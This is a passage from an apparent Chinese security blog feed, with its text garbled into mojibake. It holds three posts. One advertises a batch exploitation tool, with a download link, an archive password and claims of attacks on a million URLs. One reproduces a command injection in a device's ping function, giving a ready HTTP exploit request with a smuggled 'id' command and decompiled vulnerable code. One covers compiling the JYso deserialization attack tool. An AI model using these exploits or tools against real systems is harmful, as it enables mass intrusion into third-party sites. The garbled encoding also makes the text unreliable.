å…¥é¢‘é“ã€‚<br>ä¸‹è½½åœ°å€:<br><a href="https://www.upload.ee/files/16822507/hwok.7z.html">https://www.upload.ee/files/16822507/hwok.7z.html</a> è½¯ä»¶4æœˆä»½ç‰ˆæœ¬expæ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ã€‚æ¡†æ¶æ˜¯4æœˆä»½çš„è¿™ä¸ªç‰ˆæœ¬è¾¾åˆ°ä¸€å®šç¨‹åº¦å°±ä¼šå‡ºç°å¥”æºƒã€‚æ‰€ä»¥è®¾ç½®äº†æœ€å¤§æ¡æ•°5000æ¡ã€‚2024-10-31æ—¥è½¯ä»¶è¿‡æœŸã€‚æ…¢æ…¢ç”¨å§ã€‚å°±åˆ«åˆ†äº«äº†è‡ªå·±ç”¨å°±è¡Œäº†ã€‚æˆæƒæ–‡ä»¶ä¸‹è½½:<a href="https://www.upload.ee/files/16851948/license.7z.html">https://www.upload.ee/files/16851948/license.7z.html</a> è§£å‹å¯†ç :GL@kEzDu&amp;lh7 æ³¨æ„:ä¸‹è½½çš„æ—¶å€™æœ‰å¹¿å‘Šå¦‚æœå¼¹åˆ°åˆ«çš„ç½‘ç«™å…³é—­ã€‚å›åˆ°åŸæ¥çš„åœ°æ–¹åœ¨ç‚¹å‡»ä¸‹è½½ã€‚ç›´åˆ°å¼¹å‡ºhwok.7zæ‰æ˜¯çœŸæ­£ä¸‹è½½çš„è½¯ä»¶ã€‚å¦ä¸€ä¸ªä¹Ÿä¸€æ ·ã€‚è‡ªå·±ç¢ç£¨å§ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ„Ÿè°¢å…„å¼Ÿä»¬æ¨èä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯ä½è°ƒä½¿ç”¨ã€‚å¦å¤–å…³äºä¸Šè¿°æ–‡ç« è¯´å¼€æºã€‚é‚£æ˜¯å¯¹å°‘éƒ¨åˆ†äººè€Œä¸æ˜¯å¤§éƒ¨åˆ†äººã€‚å› ä¸ºè½¯ä»¶å·²ç»æµ‹è¯•äº†100wæ¡url è‡ªåŠ¨åŒ–å…¨æ¨¡å—æ‰¹é‡æµ‹è¯•æˆåŠŸã€‚å¦‚æœå¤§éƒ¨åˆ†äººæœ‰è¿™ä¸ªæºä»£ç ä¼šå¯¹äº’è”ç½‘ç½‘ç«™è¿›è¡Œå¤§æ‰¹é‡æ”»å‡»æ‰€ä»¥ã€‚æˆ‘ä»¬æœ‰50å¥—æºä»£ç ã€‚<br>æµ‹è¯•100w æˆåŠŸæˆªå›¾</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271554216.png" alt="100wå…¨æ¨¡å—æµ‹è¯•æˆåŠŸ"><br>æµ‹è¯•è¯¦æƒ…æˆªå›¾</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271556104.png" alt="100w urlæµ‹è¯•æˆåŠŸæˆªå›¾"><br>å¦å¤–æœ‰å›½å¤–exp pocçš„å¯ä»¥å’Œæˆ‘ä»¬è”ç³»ä»¥åå›½å¤–çš„ç½‘ç«™æ˜¯å·¨å¤§çš„å¸‚åœºã€‚æ¼æ´è¶Šå¤šæˆ‘ä»¬çš„è½¯ä»¶å¯ä»¥è‡³å°‘æ‰¹é‡100wæ¡é‚£ä¹ˆå›½å¤–çš„å¸‚åœºå°±æ˜¯æˆ‘ä»¬çš„ä½ æ‡‚çš„ã€‚åç»­ä¸ç®¡æ˜¯æ¨å¹¿ä»€ä¹ˆæ— æ•Œçš„å­˜åœ¨ã€‚å¦å¤–å…³äºæºä»£ç çš„è¯·å…³æ³¨é¢‘é“ã€‚å‡†å¤‡ç¼–ç¨‹çŸ¥è¯†å’Œ$å½“ç„¶è¿™äº›é¢‘é“æœ‰ä»‹ç»ã€‚è¯¦ç»†çœ‹é¢‘é“å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”³ç“¯ä»»æ„æ–‡ä»¶ä¸‹è½½å‘½ä»¤æ‰§è¡Œå¤ç›˜å®¡è®¡</title>
      <link href="/codeaudit/2024/05/articles/c5b634cfecad72ae/"/>
      <url>/codeaudit/2024/05/articles/c5b634cfecad72ae/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨çœ‹å…¬ä¼—å·è¿™ç¯‡<br><a href="https://mp.weixin.qq.com/s/9w2OgEZCSteyFyfeHx1eEA">https://mp.weixin.qq.com/s/9w2OgEZCSteyFyfeHx1eEA</a><br>æ–‡ç« å,æˆ‘å°è¯•ä½¿ç”¨è‡ªå·±çš„æ–¹å¼å¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œå¤ç›˜ã€‚å› ä¸ºäºŒè¿›åˆ¶æ¼æ´å®¡è®¡è¿™ç©æ„æˆ‘ä¹Ÿæ²¡æœ‰æè¿‡æ‰€ä»¥æ­£å¥½çœ‹çœ‹ã€‚ç”±äºæˆ‘æ˜¯ç¬¬ä¸€æ¬¡æè¿™ä¸ªæ–‡ç« æœ‰å†™çš„ä¸æ˜¯å¾ˆæ˜äº†çš„ã€‚è¯·å¤šå¤šåŒ…æ¶µã€‚æ¥ä¸‹æ¥è¨€å½’æ­£ä¼ å¼€å§‹åˆ†æã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æˆ‘ä»¬é¡ºç€ä»–è¯´çš„å»åå¸è®ºå›å»å¯»æ‰¾å…³é”®å­—ã€‚æ‰¾åˆ°è¿™ä¸ªã€‚æ¥ä¸‹æ¥æˆ‘ä»¬<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311419129.png" alt="æ‰¾æ–‡ç« "><br>æˆ‘ä»¬åœ¨fofaä¸Šé¢æœç´¢ç›¸å…³èµ„äº§çœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311422372.png" alt="fofaèµ„äº§"><br>exp å¦‚ä¸‹:</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>main<span class="token operator">/</span>deal HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxx<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">119.0</span><span class="token number">.6045</span><span class="token number">.160</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9If-None-Match: "1363177655"If-Modified-Since: Sat, 20 Apr 2024 12:24:18 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 71addr_value=219&amp;pingname=127.0.0.1+-c+1+%0aid%0a&amp;pingtime=2&amp;packetsize=4</span></code></pre><p>å®æˆ˜æ•ˆæœå¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311425974.png" alt="å®æˆ˜æ•ˆæœ"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æˆ‘ä»¬ä¸‹è½½ä¸‹è¿™ä¸ªæ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311430818.png" alt="ä¸‹è½½"><br>æˆ‘ä»¬ä½¿ç”¨idaæ‰“å¼€è¿›è¡Œåˆ†æã€‚ä¸€èˆ¬C æˆ–è€…C++å†™éƒ½æ˜¯mainå‡½æ•°å¼€å¤´çš„æ‰€ä»¥æˆ‘ä»¬ç›´æ¥æœç´¢ä¸€ä¸‹main<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311433216.png" alt="mianå‡½æ•°"><br>æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªè¯·æ±‚æ–¹å¼çš„å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311434398.png" alt="è¯·æ±‚æ–¹æ³•"><br>åˆ¤æ–­è¯·æ±‚æ–¹å¼æ˜¯getè¿˜æ˜¯post<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311435378.png" alt="åˆ¤æ–­è¯·æ±‚æ–¹å¼"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311441011.png" alt="åˆ¤æ–­è¯·æ±‚"><br>å¦å¤–è¿™é‡Œä¹Ÿå¯ä»¥è¯æ˜postè¯·æ±‚æ˜¯å»LABEL_32<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311451167.png"><br>åœ¨C++å’ŒCä¸­1ä»£è¡¨true<br>å¦‚æœæ˜¯postè¯·æ±‚ä½¿ç”¨å¹¶ä¸”content-lengthå¤§å°ä¸æ˜¯0 ä¹Ÿå°±æ˜¯æœ‰è¯·æ±‚æ•°æ®é‚£ä¹ˆåˆ°</p><pre class="language-C" data-language="C"><code class="language-C">LABEL_32:    v8 &#x3D; sub_11B80();    sub_25B2C();    return v8;  &#125;  if ( !sub_243D4() )    goto LABEL_32;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311447534.png" alt="åˆ¤æ–­"><br>æˆ‘ä»¬çœ‹sub_11B80å‡½æ•°<br>æˆ‘ä»¬çœ‹è¿™é‡Œ åº”è¯¥æ˜¯åˆå§‹åŒ–å‚æ•°</p><pre class="language-C" data-language="C"><code class="language-C">sub_26274(&quot;addr_value&quot;, &amp;v5, 0);  sub_26274(&quot;checksend&quot;, &amp;v4, 0);  sub_26274(&quot;language&quot;, &amp;dword_41848, 0);  sub_25CFC(&quot;username&quot;, &amp;dword_41E64, 32);  sub_25CFC(&quot;inputCode&quot;, v3, 8);  </code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311454129.png" alt="ç¡®å®å¾ˆåƒ"><br>æˆ‘ä»¬çœ‹åˆ°expé‡Œé¢æœ‰è¿™ä¸ªaddr_value æˆ‘çœ‹è¿½è¸ªçœ‹çœ‹<br>æˆ‘ä»¬çœ‹åˆ°çŸ¥é“v5æ˜¯219çš„æ—¶å€™æˆ‘ä»¬æ ¹æ®ä»¥ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311500368.png" alt="è·Ÿè¿›exp"><br>æˆ‘ä»¬çœ‹åˆ°ä¸‹å›¾</p><pre class="language-C" data-language="C"><code class="language-C">int sub_171CE()&#123;  int v1; &#x2F;&#x2F; [sp+8h] [bp+8h] BYREF  int v2; &#x2F;&#x2F; [sp+Ch] [bp+Ch] BYREF  _BYTE v3[40]; &#x2F;&#x2F; [sp+10h] [bp+10h] BYREF  memset(v3, 0, sizeof(v3));  sub_25CFC((int)&quot;pingname&quot;, v3, 40);  sub_26274(&quot;pingtime&quot;, &amp;v2, 5);  sub_26274(&quot;packetsize&quot;, &amp;v1, 56);  sub_1DBD2(v3, v2, v1);  printf(&quot;&lt;script language&#x3D;javascript&gt;window.location.href&#x3D;&#39;webmain?headlist&#x3D;%d&amp;list&#x3D;%d&#39;&lt;&#x2F;script&gt;&quot;, 3, 4);  return 0;&#125;</code></pre><p>æˆ‘ä»¬çœ‹åˆ°v3 v2 v1éƒ½è¢«èµ‹äºˆå¤§å° å…¶ä¸­V3 é•¿åº¦æ˜¯40 ä¼ å…¥sub_1DBD2<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311501204.png" alt="è¿½è¸ªä»£ç "><br>æˆ‘ä»¬ç»§ç»­çœ‹sub_1DBD2 æˆ‘ä»¬çœ‹åˆ°</p><pre class="language-C" data-language="C"><code class="language-C">int __fastcall sub_1DBD2(const char *a1, int a2, int a3)&#123;  char v7[128]; &#x2F;&#x2F; [sp+18h] [bp+10h] BYREF  system(&quot;rm -rf ..&#x2F;www&#x2F;pingresult.txt&quot;);  sprintf(v7, &quot;ping %s -c %d -s %d &gt;&gt; ..&#x2F;www&#x2F;pingresult.txt&quot;, a1, a2, a3);  system(v7);  return 0;&#125;</code></pre><p>ä¸Šè¿°ä»£ç ç†è§£ä¸º</p><pre class="language-C" data-language="C"><code class="language-C">char v7[10]; &#x2F;&#x2F; å‡è®¾v7çš„å®¹é‡ä¸º10sprintf(v7, &quot;%d&quot;, 2);  V7 è¢«èµ‹å€¼ä¸º2 ä¹Ÿå°±æ˜¯V7&#x3D;2 ç­‰äºæ•°å­—äºŒ</code></pre><p>æ‰€ä»¥ç”±ä¸Šè¿°å¯ä»¥çŸ¥é“ a1 a2 a3 è¿™ä¸‰ä¸ªå‚æ•°éƒ½å¯ä»¥å¯ä»¥æ§åˆ¶çš„å¹¶ä¸”ä¼ å…¥systemæ‰§è¡Œé€ æˆå‘½ä»¤æ‰§è¡Œæˆ‘ä»¬æ¼”ç¤ºä¸€ä¸‹</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>main<span class="token operator">/</span>deal HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxx<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">119.0</span><span class="token number">.6045</span><span class="token number">.160</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9If-None-Match: "1363177655"If-Modified-Since: Sat, 20 Apr 2024 12:24:18 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 70addr_value=219&amp;pingname=127.0.0.1&amp;pingtime=1&amp;packetsize=1</span></code></pre><p>æ‰§è¡Œå‘½ä»¤æˆåŠŸã€‚æˆ‘ä»¬åœ¨åŸæœ‰expåŸºç¡€ä¸ŠåŠ å…¥è¿›å»ä¸€ç‚¹ä¸œè¥¿<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311510822.png" alt="æ‰§è¡ŒæˆåŠŸ"></p><h2 id="è‡ªåŠ¨åŒ–"><a href="#è‡ªåŠ¨åŒ–" class="headerlink" title="è‡ªåŠ¨åŒ–"></a>è‡ªåŠ¨åŒ–</h2><p>æ­¤æ¼æ´å·²ç»é›†æˆåˆ°æˆ‘ä»¬çš„å·¥å…·é‡Œé¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311550565.png" alt="è‡ªåŠ¨åŒ–"></p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jyso æœ€æ–°ç‰ˆååºåˆ—åŒ–å·¥å…·gradleç¼–è¯‘</title>
      <link href="/securitytools/2024/05/articles/c4f380e46ba1f562/"/>
      <url>/securitytools/2024/05/articles/c4f380e46ba1f562/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> æœ€æ–°åœ¨æjavaååºåˆ—åŒ–æ¼æ´åœ¨githubæœç´¢ javaååºåˆ—åŒ–å·¥å…·çªç„¶æœç´¢åˆ°ä¸€ä¸ªé¡¹ç›®ã€‚æ„Ÿè§‰è¿™ä¸ªé¡¹ç›®å¯ä»¥ã€‚ä½œè€…ä¹Ÿåœ¨ä¸€ç›´æ›´æ–°æ‰€ä»¥ä¸‹è½½ä¸‹æ¥ç¼–è¯‘ä¸€æ³¢ã€‚æ²¡æƒ³åˆ°è¿™ä¸ªæ˜¯ç”¨gradleç¼–è¯‘çš„æ¡æ“¦ã€‚æˆ‘åœ¨mavenç¼–è¯‘çš„éƒ½ä¸æ€ä¹ˆç†Ÿç»ƒã€‚è¿™gradleä¸æ˜¯æ­‡èœäº†ã€‚å†µä¸”æˆ‘è¿™æ¼æ´å·²ç»å¤ç°å¹¶ä¸”å·²ç»æ‹¿åˆ°äº†webshellã€‚æƒ³æƒ³è¿™è¦ä¸å°±ç®—äº†ã€‚åˆ«æäº†ã€‚åæ¥æƒ³äº†æƒ³è¿™ä¸ªé¡¹ç›®ä½œè€…åœ¨ä¸€ç›´æ›´æ–°ã€‚é‚£å¦‚æœåç»­åˆ«çš„å·¥å…·æä¸å®šçš„æˆ–è®¸å¯ä»¥ä½¿ç”¨è¿™ä¸ªé¡¹ç›®è¿›è¡Œæã€‚äºæ˜¯å°±å¼€æäº†ã€‚è¿™ç©æ„æˆ‘å…‰ç¼–è¯‘å’Œè§£å†³é—®é¢˜ç”¨äº†ä¸¤å¤©ã€‚æœ€åå‘ç°ç¼ºå°‘libåŒ…æˆ‘ç›´æ¥åœ¨githubæ‰¾ç›¸åŒçš„ç¼–è¯‘æˆåŠŸäº†ã€‚ä½†æ˜¯æ‰“ä¸æˆåŠŸè¿™ä¸ªä¸åœ¨è®¨è®ºèŒƒå›´å†…ã€‚ç›¸ä¿¡ä½œè€…ä¼šæŠ½æ—¶é—´æ›´æ–°é¡¹ç›®çš„è¿™ä¹ˆå¤§çš„é¡¹ç›®é€šè¯»ä»£ç å‰åç»“åˆæ‰èƒ½çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜ã€‚åºŸè¯ä¸å¤šè¯´äº†å¼€å¹²ã€‚<br/><br> é¡¹ç›®ä»£ç :<a href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a><br/><br>ä½¿ç”¨æ–¹æ³•:<a href="https://github.com/qi4L/JYso/wiki/JYso%E2%80%90CN">https://github.com/qi4L/JYso/wiki/JYso%E2%80%90CN</a></p><h2 id="ä¸‹è½½æºç ç¼–è¯‘"><a href="#ä¸‹è½½æºç ç¼–è¯‘" class="headerlink" title="ä¸‹è½½æºç ç¼–è¯‘"></a>ä¸‹è½½æºç ç¼–è¯‘</h2><p> æˆ‘ä»¬ä»githubä¸‹è½½ä»£ç ã€‚ç”±äºæºä»£ç ä½¿ç”¨idea ç¼–è¯‘æ‰§è¡Œä¸‹è½½ideaã€‚æˆ‘ä»¬å¯¹ä»£ç è¿›è¡Œè§£å‹ã€‚<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011801876.png" alt="æºç æˆªå›¾"><br> è§£å‹å¹¶ä¸”åˆ é™¤å›¾ä¸‹é¢ç”»æ¡†çš„.idea å’Œgradle ä½¿ç”¨ä½¿ç”¨ideaæ‰“å¼€ä»£ç <br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011805272.png" alt="åˆ é™¤æ–‡ä»¶å¤¹"><br> åˆ é™¤ä½¿ç”¨ideaæ‰“å¼€<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011806794.png" alt="åˆ é™¤å"><br>åœ¨fileæ‰¾åˆ°settingç•Œé¢æ‰¾åˆ°gradleã€‚åˆ›å»ºä¸€ä¸ªgradleæ–‡ä»¶å¤¹é€‰æ‹©ç„¶åæŒ‰ç…§ä¸‹å›¾é…ç½®ã€‚ç‚¹å‡»åº”ç”¨ã€‚ç‚¹å‡»okå°±è¡Œäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011809596.png" alt="å›¾é…ç½®"><br>ç„¶åä½ ä¼šçœ‹åˆ°ä¸‹è½½jaråŒ…å•¥çš„ä¸‹è½½å®Œæ¯•ä»¥åä½ ä¼šå‘ç°è¿™ç§é”™è¯¯ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Could</span> not find javax<span class="token punctuation">.</span>media<span class="token punctuation">.</span>jai<span class="token operator">:</span>jai<span class="token operator">-</span>core<span class="token operator">:</span><span class="token number">1.1</span><span class="token number">.3</span><span class="token punctuation">.</span><span class="token class-name">Required</span> by<span class="token operator">:</span>    project <span class="token operator">:</span><span class="token class-name">Possible</span> solution<span class="token operator">:</span> <span class="token operator">-</span> <span class="token class-name">Declare</span> repository providing the artifact<span class="token punctuation">,</span> see the documentation at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token operator">/</span>current<span class="token operator">/</span>userguide<span class="token operator">/</span>declaring_repositories<span class="token punctuation">.</span>html  <span class="token class-name">Could</span> not find com<span class="token punctuation">.</span>oracle<span class="token punctuation">.</span>weblogic<span class="token operator">:</span>weblogic<span class="token operator">-</span>server<span class="token operator">:</span><span class="token number">1.0</span><span class="token punctuation">.</span><span class="token class-name">Required</span> by<span class="token operator">:</span>    project <span class="token operator">:</span><span class="token class-name">Possible</span> solution<span class="token operator">:</span> <span class="token operator">-</span> <span class="token class-name">Declare</span> repository providing the artifact<span class="token punctuation">,</span> see the documentation at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token operator">/</span>current<span class="token operator">/</span>userguide<span class="token operator">/</span>declaring_repositories<span class="token punctuation">.</span>html</code></pre><p>æˆ‘ç¬¬ä¸€é¡µçœ‹åˆ°ä¸Šé¢çš„é”™è¯¯å°±æ˜¯ç™¾åº¦äº†ä¸€æ³¢å‘ç°å°±æ˜¯æ²¡æœ‰æ‰¾åˆ°åŒ…ä»€ä¹ˆçš„ã€‚ç„¶åæˆ‘ä»¬åœ¨mainä¸‹é¢åˆ›å»ºä¸€æ³¢libç›®å½•ç„¶åä»æ‰¾åˆ°åŒ…ã€‚æ‰¾åŒ…è¿‡ç¨‹å¤ªå‘çˆ¹äº†ã€‚æ‰€ä»¥æˆ‘ç›´æ¥æŠŠåŒ…çš„åå­—æ”¾å‡ºæ¥äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011812163.png" alt="åˆ›å»ºlibç›®å½•"></p><pre class="language-java" data-language="java"><code class="language-java">jai_core<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.3</span><span class="token punctuation">.</span>jarweblogic<span class="token operator">-</span>server<span class="token punctuation">.</span>jarwlthint3client<span class="token punctuation">.</span>jar</code></pre><p>æˆ‘ä»¬æŠŠåŒ…å¯¼å…¥äº†å¦‚ä½•è®©ä»–è¯†åˆ«å‘¢è¿™ä¸ªæ˜¯é‡ç‚¹æˆ‘ä»¬åœ¨build.gradle æ–‡ä»¶ä¸­å†™è¿™æ®µä»£ç </p><pre class="language-java" data-language="java"><code class="language-java">api <span class="token function">fileTree</span><span class="token punctuation">(</span>dir<span class="token operator">:</span>'src<span class="token operator">/</span>main<span class="token operator">/</span>lib'<span class="token punctuation">,</span>include<span class="token operator">:</span><span class="token punctuation">[</span><span class="token char">'*.jar'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç‚¹åŒæ­¥ä¸¤ä¸ªç®­å¤´ç¯ç»•çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011820209.png" alt="ç‚¹åŒæ­¥"><br>å‡ºç°ä¸‹å›¾è¯´æ˜è¯†åˆ«æˆåŠŸäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011819308.png" alt="è¯†åˆ«æˆåŠŸ"><br>æˆ‘ä»¬åœ¨ç‚¹åŒæ­¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011820209.png" alt="ç‚¹åŒæ­¥"><br>è¿˜æ˜¯æŠ¥é”™ã€‚æ˜¯ä¸æ˜¯è¿™æ—¶å€™æ‡µé€¼äº†ã€‚åˆ«ç€æ€¥æˆ‘ä»¬æ²¡çœ‹å…¶ä»–æ–‡ä»¶æˆ‘ä»¬çœ‹çœ‹å“ªé‡Œæœ‰javax.media.jai:jai-core<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011822054.png" alt="è¿˜æ˜¯æŠ¥é”™"><br>æœ€åå‘ç°åœ¨libs.versions.toml å‘ç°äº†æˆ‘ä»¬æŠŠå®ƒæ³¨é‡Šäº†ã€‚æœ‰äººè¯´äº†è¿™æ³¨é‡Šäº†ä¸æ›´æ‰¾ä¸åˆ°äº†ã€‚åˆ«å¿˜äº†æˆ‘ä»¬åœ¨libç›®å½•é‡Œé¢å·²ç»ç»™ä»–jaråŒ…äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011824122.png" alt="æ³¨é‡Šè¿™ä¸ªå¼æ¯›"><br>æ³¨é‡Šè¿™ä¸ªå¼æ¯›<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011825797.png" alt="åŒæ ·æ³¨é‡Šè¿™ä¸ªå¼æ¯›"><br>ç„¶ååœ¨åŒæ­¥åç»­åˆæŠ¥é”™äº†</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span>InvalidUserDataException</span><span class="token operator">:</span> <span class="token class-name">Invalid</span> catalog definition<span class="token operator">:</span>  <span class="token operator">-</span> <span class="token class-name">Problem</span><span class="token operator">:</span> <span class="token class-name">In</span> version catalog libs<span class="token punctuation">,</span> version reference 'javax<span class="token punctuation">.</span>media<span class="token punctuation">.</span>jai<span class="token punctuation">.</span>jai<span class="token punctuation">.</span>core<span class="token char">' doesn'</span>t exist<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token 